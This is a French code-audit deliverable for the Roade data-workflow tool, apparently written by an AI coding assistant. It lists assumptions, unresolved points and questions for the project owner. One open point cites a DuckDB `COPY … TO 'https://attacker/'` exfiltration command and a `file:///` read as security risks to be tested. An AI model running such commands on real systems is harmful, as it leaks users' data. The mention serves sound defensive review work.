# 09 — Hypothèses, points non tranchés, questions au commanditaire

> Dernier livrable. Tout ce qui suit a influencé la rédaction des 8 fichiers précédents et **demande confirmation** avant qu'une roadmap soit bâtie dessus. Trois sections : hypothèses (que j'ai prises), zones grises (que je n'ai pas pu trancher en lecture statique), questions (qui modifieraient la priorisation).

---

## 1. Hypothèses faites pendant l'audit

> Ces affirmations ne viennent pas d'un échange explicite — elles sont déduites de ce que j'ai lu. Si l'une est fausse, le diagnostic correspondant doit être recalibré.

### H1 — Le **public visé** est l'auteur lui-même + une poignée de collègues data, pas des tiers anonymes
Indices : auteur unique sur l'historique git (`git log --format="%an"` → un seul nom), commit `ced6b01` qui ajoute un brief « de l'amateur au pro », README majoritairement orienté usage personnel.
**Si c'est faux** (visée : grand public) : la priorité « projet de démo + onboarding » (§ 04, parcours 1) passe en **haut** ; idem licence, RGPD, charte d'usage.

### H2 — Roade reste **local et mono-utilisateur**
Indices : `CORSMiddleware allow_origins=["*"]` + zéro authentification (`main.py:27-32`), backend `127.0.0.1:8000`, scripts `start.ps1`/`start.bat` orientés une machine.
**Si c'est faux** (cible SaaS / multi-utilisateur à terme) : les risques § 5 du 07 (CORS, path-traversal, raw SQL) deviennent **bloquants critiques** et toutes les routes ont besoin d'un modèle d'authn/autz **avant** d'autres travaux.

### H3 — Windows est la **plateforme principale**, macOS/Linux sont au mieux secondaires
Indices : `start.ps1`/`start.bat`, hardcode `backend\.venv\Scripts\python.exe`, `os.startfile` est le chemin prioritaire dans `_open_in_os`, pas de `start.sh`.
**Si c'est faux** : la roadmap inclut un effort de packaging multiplateforme (cf. § 07 § 7).

### H4 — Les utilisateurs sont **francophones** et manipulent des fichiers FR (CSV `;` / `1 234,56`)
Indices : vocabulaire UI 100 % FR (constat 06 § 30 sur les libellés codés en dur), `toLocaleString('fr-FR')` partout (`DataPreview.jsx`, `BlockEditor.jsx`), origine bretonne du nom (`README.md:1-3`).
**Si c'est faux** (audience EN) : le risque #1 du 08 (CSV FR mal lu) cesse d'être prioritaire, mais l'absence d'i18n centralisée (constat 03/05) devient bloquante.

### H5 — `projects/` n'est **pas versionné**, et c'est volontaire
Confirmé par `.gitignore:4`. Les données utilisateur sont *sur la machine de l'utilisateur*, jamais commitées. La supposition correspond ; aucun risque de fuite accidentelle via git.

### H6 — Aucune licence n'est encore choisie
Indices : pas de `LICENSE`, pas de `COPYING`. Repo public sur GitHub (`https://github.com/MaloLeCouls/Roade.git`) — donc actuellement « tous droits réservés » par défaut, ce qui interdit légalement à un tiers de l'utiliser/forker.
**Si la cible est l'open source** : poser une licence (MIT/Apache 2.0/AGPL selon stratégie) **avant** toute promotion.

### H7 — Les **fichiers Excel** sont le format dominant ; le CSV est secondaire
Indices : palette de blocs Source décrit « Lit un fichier Excel/CSV » (Excel d'abord), `_EXCEL_EXT = (".xlsx", ".xls", ".xlsm")`, l'aperçu de Source liste *sheets* en premier (`engine.py:233-237`). Le « Documenter » est livré **uniquement** en `.xlsx`.
**Si c'est faux** : l'export CSV (figé UTF-8 / virgule) devient prioritaire à corriger.

### H8 — La **volumétrie typique** est en dizaines de Mo / centaines de milliers de lignes, pas en Go
Indices : aucun streaming dans `_read_source`, plafond d'aperçu à 200 lignes, calibrage Source EMA basé sur des octets en `localStorage`, aucun garde-fou sur la limite Excel 1 048 576 lignes.
**Si c'est faux** (cible : très gros fichiers) : la stratégie d'exécution doit être repensée (lazy, chunking, hors-mémoire).

### H9 — Les workflows ne sont **pas importés depuis l'extérieur**
Indices : pas de route d'import de workflow JSON (uniquement `POST /api/projects/{pid}/workflows` avec `{name}`), pas de drag-drop d'un `.json` côté UI. Les workflows naissent dans le projet courant.
**Si c'est faux** (futur : partager des workflows) : le risque DuckDB raw (§ 5.4 du 07) devient critique — un workflow tiers peut lire/écrire n'importe quoi.

### H10 — L'auteur **utilise Roade lui-même** pour des cas réels (codification Sermatec)
Indices : `projects/codif-sermatec/workflows/582acec9.json` repéré dans le repo en suivi (?), entrée dans `.gitignore` mais probablement ignorée par grep historique. Le bloc Validation est sur-dimensionné par rapport aux autres (§ 03) — signe d'un usage métier intense.
**Si c'est faux** : la dissymétrie Validation/reste perd son explication directe.

### H11 — L'objectif n'est **pas** un produit commercial mais un **étalon personnel de qualité**
Indices : ton du brief `ROADE_GUIDE_CLAUDE_CODE.md` (« le chantier de l'amateur au pro »), pas de modèle économique évoqué, pas de marque/identité visuelle externe.
**Si c'est faux** (commercialisation prévue) : la roadmap inclut juridique (RGPD, CGU, hébergement), pricing, support.

### H12 — Le **moteur incrémental** est considéré comme abouti
Indices : auteur fier de la barre de progrès SSE et du cache (commit messages, atouts F1–F3 du 05), modifs récentes portent sur des cas limites (élagage des sorties, etc.), pas sur l'incrémental lui-même.
**Si c'est faux** : revoir § 6 du 08 (correction de la signature de cache) plus tôt.

---

## 2. Ce que je n'ai pas pu trancher en lecture statique

> Zones où le code permet *deux interprétations*, où j'aurais besoin de l'exécuter, ou d'une décision externe.

### Z1 — Le comportement exact du `csv.Sniffer` sur les CSV ambigus
J'ai documenté (08 § 2.1) que `sep=None, engine="python"` utilise le sniffer. Je n'ai **pas exécuté** un cas pathologique (CSV à 1 colonne contenant des `,` dans le texte) pour confirmer le mode d'échec exact (silencieuse mauvaise séparation vs `csv.Error`).
**Pour trancher** : `pytest` sur 5–10 CSV pathologiques.

### Z2 — Le comportement de DuckDB `httpfs` activé par défaut
J'ai supposé (07 § 5.4) que `httpfs` permettrait l'exfiltration par `COPY … TO 'https://attacker/'`. Sur DuckDB 1.3.2 sans `INSTALL httpfs`, l'extension n'est pas chargée → l'exfiltration HTTP n'est pas triviale. Mais `read_csv_auto('file:///…')` reste possible.
**Pour trancher** : tester un workflow `raw` avec `LOAD httpfs;` sur la version épinglée.

### Z3 — La taille des projets actuels chez l'auteur
Combien de projets, combien de workflows, combien de blocs en moyenne, combien de Mo de parquets ?
**Pour trancher** : `du -sh projects/*` chez le commanditaire.

### Z4 — La performance perçue avec ~50 blocs
Je m'attends à des lenteurs (§ 6 du 07 : pas de `memo()`, recalcul `dirtyMap` à chaque rendu). Pas mesuré en pratique. L'auteur n'a peut-être jamais dépassé 15 blocs.
**Pour trancher** : un workflow factice de 100 blocs.

### Z5 — Si l'utilisateur a déjà rencontré le bug CSV FR
Si oui, il a probablement contourné (ouvre dans Excel d'abord, re-sauve en UTF-8). Si non, il n'est jamais tombé dessus parce que sa volumétrie est en Excel pur.
**Pour trancher** : interroger directement.

### Z6 — Le format du `compass_artifact_*.md` à la racine
`grep "## "` dans `.gitignore:11` : « Recherche externe sans rapport avec Roade (tombée dans le dossier) ». Donc à ignorer, mais qu'est-ce que c'était ? Un benchmark ? Un research deep-dive ? Inclure ou non dans l'étape 3 dépend du contenu.
**Pour trancher** : confirmer son utilité (sinon, supprimer).

### Z7 — Le rôle du « `Plan de travail Traitement fichiers.xlsx` » à la racine
Document **versionné**, mais le contenu n'est pas lisible par grep. Si c'est un plan de roadmap, il devrait être intégré au pipeline d'audit. Si c'est un fichier de test, il devrait être dans `projects/` (ignoré).
**Pour trancher** : ouverture du fichier.

### Z8 — La cohérence entre le `runStream` SSE et l'`ErrorBoundary`
Si un block runner lève brutalement, le SSE renvoie `event: 'error'`. Mais si le runner produit un *output cassé* (NaN partout, colonne tronquée), aucun mécanisme ne le détecte. Y a-t-il déjà eu des cas où la sortie a *l'air* OK mais est subtilement fausse ?
**Pour trancher** : retours utilisateur.

### Z9 — Les performances de `documentWorkflow`
`workflow_doc.py` fait **1 007 LOC**. Un workflow complexe peut générer un Excel volumineux. Combien de secondes typiquement ?
**Pour trancher** : timing.

### Z10 — La position du `_selftest.py`
Préfixe `_` (comme les `_test_*`) mais nom différent. Couvre-t-il le smoke d'intégration ? Doit-il rejoindre la convention `_test_smoke.py` ?
**Pour trancher** : lecture courte du fichier.

---

## 3. Questions au commanditaire

> Classées par impact sur la roadmap. Chaque question, si tranchée en sens A vs B, déplace significativement les priorités.

### Q1 — **Cap final : usage personnel ou produit pour des tiers ?**
*Pourquoi ça change tout :* si tiers, la sécurité (CORS, auth, path-traversal — 07 § 5), l'a11y (05 § 6), l'i18n (03 col. 10), la distribution (07 § 7) et la licence (H6) deviennent des prérequis. Si personnel, tout cela passe au second plan derrière l'intégrité des données et la profondeur des blocs.

### Q2 — **Multi-utilisateur / cloud / SaaS un jour ?**
*Pourquoi ça compte :* la « couche d'état » P4 (React Query, etc.) prend un sens différent. L'architecture data (parquets locaux vs DB partagée) doit être pensée dès maintenant si la réponse est *oui*. Si non, on peut continuer à hardcoder `127.0.0.1` et l'arborescence disque.

### Q3 — **Windows uniquement ou multiplateforme ?**
*Pourquoi ça compte :* `start.ps1`/`start.bat` peuvent rester (Windows-first) ou doivent être doublés (`start.sh`, Docker, packager type Tauri/Electron pour un installeur). Cela conditionne aussi les tests E2E.

### Q4 — **Quelle est la volumétrie médiane et la volumétrie max d'un fichier Source ?**
*Pourquoi ça compte :* dictée le besoin de streaming/chunking. À 50 Mo, on reste sur `pd.read_excel` mémoire. À 500 Mo, il faut une autre stratégie. À 5 Go, c'est une refonte complète du pipeline (PyArrow streaming, DuckDB direct sur le fichier).

### Q5 — **Combien de blocs typique dans un workflow réel ?**
*Pourquoi ça compte :* à 10 blocs, `memo()` est cosmétique. À 80 blocs, c'est bloquant. À 500 blocs (par exemple un workflow d'agrégation industriel), il faut repenser l'IA (palette latérale, recherche, minimap dynamique).

### Q6 — **Les utilisateurs (toi inclus) ont-ils déjà importé un fichier qui a planté ou produit un mauvais résultat ?**
*Pourquoi ça compte :* permet de trancher quelles failles du 08 sont des risques *théoriques* et lesquelles sont des incidents *vécus*. La priorité d'un fix dépend autant de l'exposition que de l'historique.

### Q7 — **L'export Excel « Documenter » est-il déjà partagé à des collègues / hiérarchie ?**
*Pourquoi ça compte :* si oui, sa **lisibilité** et sa **portabilité** (encodage, formules, formats de cellule) deviennent critiques. Si non, il reste un outil de debug et peut évoluer plus librement.

### Q8 — **Les CSV traités sont-ils plutôt FR (`;` + `,` décimale) ou plutôt EN (`,` + `.` décimale) ?**
*Pourquoi ça compte :* H4 confirmée ou infirmée. Calibre la priorité du risque #1 du 08.

### Q9 — **Y a-t-il un cas d'usage où l'utilisateur veut partager un workflow JSON à un autre utilisateur ?**
*Pourquoi ça compte :* infirme H9. Si oui, il faut sandboxer DuckDB `raw` mode ou désactiver l'import non-signé.

### Q10 — **L'utilisateur (toi) a-t-il déjà utilisé `Tout recalculer` parce qu'un bloc avait servi un cache « périmé » ?**
*Pourquoi ça compte :* confirme ou infirme l'existence de bugs de signature (08 § 6). Un seul cas vécu = priorité élevée.

### Q11 — **L'auteur souhaite-t-il **continuer seul** ou **accueillir des contributeurs** à terme ?**
*Pourquoi ça compte :* contributeurs ⇒ ESLint, Prettier, CI, TypeScript, primitives React extraites (07 § 3, 06 § 4) **avant** toute autre étape. Sans cela, un PR est ingérable.

### Q12 — **Existe-t-il une concurrence directe à laquelle Roade se compare au quotidien (KNIME, Easy Data Transform, Alteryx, Power Query) ?**
*Pourquoi ça compte :* dictée la stratégie « atouts différenciateurs ». Le « Documenter » Excel et le dry-run live de Validation sont des différenciateurs *rares* — à mettre en avant.

### Q13 — **Quelle est la fréquence d'usage : occasionnel, hebdo, quotidien ?**
*Pourquoi ça compte :* un usage quotidien justifie les raccourcis clavier (05 § constat #13), la palette de commandes Ctrl+K, l'historique de runs. Un usage hebdo rend ces priorités plus modestes.

### Q14 — **Le fichier `compass_artifact_*.md` et le `Plan de travail Traitement fichiers.xlsx` — sont-ils des entrées à intégrer à l'audit, ou des artefacts à supprimer ?**
*Pourquoi ça compte :* deux pistes potentielles de contenu déjà rédigé.

### Q15 — **As-tu une préférence sur la nature de l'étape 3 ?**
- **Option A** : une todolist plate, ordonnée par sévérité.
- **Option B** : 3–5 chantiers structurés (sécurité, données FR, design system, UX socle, distribution) avec dépendances et estimés.
- **Option C** : un *master plan* en milestones (« v0.2 — données fiables », « v0.3 — UX pro », « v0.4 — distribution »).
*Pourquoi ça compte :* conditionne la **forme** du livrable de l'étape 3 et le niveau de détail à viser.

---

## 4. Récapitulatif — ce qui est *connu* vs *à confirmer*

| Domaine | Connu (sourcé) | À confirmer |
|---|---|---|
| Sécurité | CORS `*`, path-traversal, raw DuckDB possible | Sévérité réelle selon Q1/Q2/Q9 |
| Données FR | Pas d'encoding, pas de décimale, pas de milliers | Audience (Q8), historique d'incidents (Q6) |
| Profondeur des blocs | Validation surdimensionnée, Union/Pivot minces | Si l'asymétrie correspond aux usages réels |
| Performance | Pas de memo, recalculs O(N+E), aperçu paginé | Volumétrie / nb de blocs réels (Q4, Q5) |
| Design system | 23 tokens, ~30 motifs UI non factorisés | Plan d'évolution (Q11) |
| Tests / CI | 10 smoke tests, aucune CI | Tolérance au risque (Q11) |
| Distribution | Windows-only, 0 release | Cible (Q1, Q3) |
| Roadmap | 8 fichiers d'audit produits, dissymétries cartographiées | Forme et tranche de l'étape 3 (Q15) |

---

> **Pour clore l'étape 2.** Les fichiers `00` à `09` sont rédigés. Chaque constat factuel est sourcé à `fichier:ligne`. Aucun fichier de code applicatif n'a été modifié. Avant d'attaquer l'étape 3, je propose de **passer les 15 questions ci-dessus** — même rapidement — pour figer le périmètre du chantier et la forme du livrable final.
